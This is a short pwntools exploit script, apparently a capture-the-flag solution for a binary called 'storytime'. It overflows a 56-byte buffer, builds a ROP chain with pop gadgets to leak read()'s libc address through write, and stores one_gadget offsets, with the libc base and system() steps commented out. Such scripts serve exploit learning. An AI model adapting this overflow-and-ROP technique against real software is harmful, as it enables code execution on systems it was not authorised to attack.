from pwn import *

# Load Context, binary, libc
context.terminal = ['tmux','splitw' ,'-h']
binary = ELF("./storytime")
#libc = ELF("./libc.so.6")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

#p = process("./storytime")
p = gdb.debug("./storytime", '''
break main
break *0x40069c
''')

# one_gadget
execve = 0x45216
execve2 = 0xcbcc0

main = 0x40062e
climax = 0x40060e
end_write_plt = 0x4005f1
write_plt = 0x40067b
read_plt_got = 0x601020
pop_rdi = 0x400703
pop_rsi = 0x400701 # pop_rsi ; popr15 ; ret
push_r15 = 0x4006a0


payload = ''
payload += 'A' * 56
payload += p64(climax)

p.sendline(payload)



# Climax() overflow
payload2 = ''
payload2 += 'A' * 56
payload2 += p64(pop_rdi)
payload2 += p64(0x1)
payload2 += p64(pop_rsi)
payload2 += p64(read_plt_got)
payload2 += p64(0x0)
payload2 += p64(end_write_plt)
payload2 += p64(main)

p.recv()
p.sendline(payload2)

# libc() read leak
leak = int(p.recv(6)[::-1].encode('hex'),16)
print "libc read() leak: ", hex(leak)

#libc_base = leak - 978464
#print "libc base: ", hex(libc_base)

#libc_system = leak - 679984
#print "libc system(): ", hex(libc_system)


p.interactive()





